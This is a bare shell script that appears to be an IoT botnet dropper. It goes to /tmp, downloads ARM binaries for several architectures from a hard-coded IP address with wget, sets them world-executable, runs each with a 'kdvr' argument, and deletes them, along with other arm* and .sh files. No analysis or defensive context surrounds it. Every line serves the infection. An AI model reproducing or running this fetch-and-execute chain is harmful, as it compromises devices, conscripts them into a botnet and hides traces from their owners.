rm -rf arm*
rm -rf *.sh
cd /tmp; wget http://45.95.146.126/spl/arm; chmod 777 arm; ./arm kdvr.arm; rm -rf arm
cd /tmp; wget http://45.95.146.126/spl/arm5; chmod 777 arm5; ./arm5 kdvr.arm5; rm -rf arm5
cd /tmp; wget http://45.95.146.126/spl/arm6; chmod 777 arm6; ./arm6 kdvr.arm6; rm -rf arm6
cd /tmp; wget http://45.95.146.126/spl/arm7; chmod 777 arm7; ./arm7 kdvr.arm7; rm -rf arm7
rm -rf ipc.sh